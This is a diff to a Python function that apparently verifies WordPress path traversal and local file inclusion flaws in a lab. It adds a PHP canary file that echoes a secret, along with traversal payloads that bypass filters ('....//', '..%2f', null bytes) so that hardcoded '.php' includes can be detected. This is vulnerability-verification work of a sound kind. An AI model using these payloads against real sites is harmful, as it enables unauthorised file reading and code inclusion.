@@ -2978,6 +2978,18 @@ def verify_wordpress_path_traversal(
         if not boot.lab.write_canary(canary_path, secret):
             res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
             return res
+        # PHP canary para LFI que hace require_once/include con sufijo '.php' hardcoded
+        # (ej. require_once __DIR__.'/tabs/'.$tab.'.php') -- el canario de texto no funciona
+        # porque PHP convierte '/tmp/HASH.txt' en '/tmp/HASH.txt.php' (inexistente).
+        # Solución: escribir un .php que ejecute echo; usar paths SIN extension para que PHP añada .php.
+        php_secret = secrets.token_hex(16)
+        php_canary_token = _token()
+        php_canary_path = f"/tmp/binoracle_canary_{php_canary_token}.php"
+        _php_canary_ok = boot.lab.write_canary(php_canary_path,
+                                                f"<?php echo '{php_secret}'; ?>")
+        if not _php_canary_ok:
+            php_secret = ""  # skip php attempts if write failed
+            php_canary_path = ""
 
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
@@ -3045,6 +3057,18 @@ def verify_wordpress_path_traversal(
         attempts += [("..\\" * n) + rel for n in depths]                       # backslash (Windows)
         attempts += [("....//" * n) + rel for n in depths]                     # bypass str_replace('../','')
         attempts += [rel + "%00", canary_path + "%00"]                         # null-byte legacy
+        # PHP-canary attempts: para LFI donde el codigo hace include/require_once con .php hardcoded
+        # (ej. require_once __DIR__.'/tabs/'.$tab.'.php') -- el .txt canary no funciona porque PHP
+        # lo convierte en .txt.php (inexistente). La solucion: usar paths SIN extension para que PHP
+        # aņada .php y ejecute el canario PHP; cualquier secreto (txt o php) detectado = exito.
+        _all_secrets = {secret}
+        if php_secret and _php_canary_ok:
+            php_rel = php_canary_path[:-4].lstrip("/")  # "tmp/binoracle_canary_TOKEN" sin .php
+            _all_secrets.add(php_secret)
+            attempts += [php_rel, php_canary_path[:-4]]
+            attempts += [("../" * n) + php_rel for n in depths]
+            attempts += [("..%2f" * n) + php_rel for n in depths]
+            attempts += [("....//" * n) + php_rel for n in depths]
         found = False
         tried = []
         for payload_value in attempts:
@@ -3065,30 +3089,35 @@ def verify_wordpress_path_traversal(
             # delante (p.ej. '{"status":"error","message":"File is not moved..."}') se ve al
             # momento si el servidor esta rechazando el intento y por que, en vez de tener que
             # adivinarlo desde fuera.
+            _resp_text = resp.text or ""
+            _hit_secret = next((s for s in _all_secrets if s in _resp_text), None)
             tried.append({"payload": payload_value, "status": resp.status_code,
-                          "secret_presente": secret in (resp.text or ""),
-                          "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
+                          "secret_presente": bool(_hit_secret),
+                          "respuesta_cuerpo_recorte": _resp_text[:300]})
             # patron "copia-y-sirve" (ver _extract_followable_urls): algunos endpoints no
             # reflejan el contenido en ESTA respuesta, copian el fichero a una ruta publica
             # nueva y devuelven DONDE quedo -- hay que pedirla aparte para ver el secreto real.
             # Se prueban todas las candidatas EN ORDEN hasta encontrar el secreto (una pagina
             # HTML normal puede traer varios src/href que no tienen nada que ver).
             followed_resp, follow_url = resp, None
-            if secret not in (resp.text or ""):
-                for candidate in _extract_followable_urls(resp.text, boot.base_url):
+            if not _hit_secret:
+                for candidate in _extract_followable_urls(_resp_text, boot.base_url):
                     try:
                         candidate_resp = _pt_sess.request("GET", candidate, timeout=20)
                     except Exception as e:
                         tried[-1].setdefault("followed_url_errors", []).append(
                             {"url": candidate, "error": str(e)})
                         continue
-                    if secret in (candidate_resp.text or ""):
+                    _candidate_hit = next((s for s in _all_secrets if s in (candidate_resp.text or "")), None)
+                    if _candidate_hit:
+                        _hit_secret = _candidate_hit
                         followed_resp, follow_url = candidate_resp, candidate
                         break
                 if follow_url:
                     tried[-1]["followed_url"] = follow_url
-                tried[-1]["followed_secret_presente"] = secret in (followed_resp.text or "")
-            if secret in (followed_resp.text or ""):
+                tried[-1]["followed_secret_presente"] = bool(
+                    next((s for s in _all_secrets if s in (followed_resp.text or "")), None))
+            if _hit_secret and _hit_secret in (followed_resp.text or ""):
                 found = True
                 res.evidence["payload_ganador"] = payload_value
                 if follow_url:
@@ -3181,9 +3210,12 @@ def verify_wordpress_path_traversal(
         elif found:
             res.verified = True
             res.ok = True
+            _used_canary = (php_canary_path if (php_secret and php_secret in
+                            (res.evidence.get("respuesta_cuerpo_recorte") or ""))
+                           else canary_path)
             res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                           f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
-                          f"plantado en {canary_path} (fuera del directorio web)")
+                          f"plantado en {_used_canary} (fuera del directorio web)")
         else:
             res.ok = True
             # el cuerpo real del PRIMER intento (la ruta absoluta sin tocar, la mas simple de
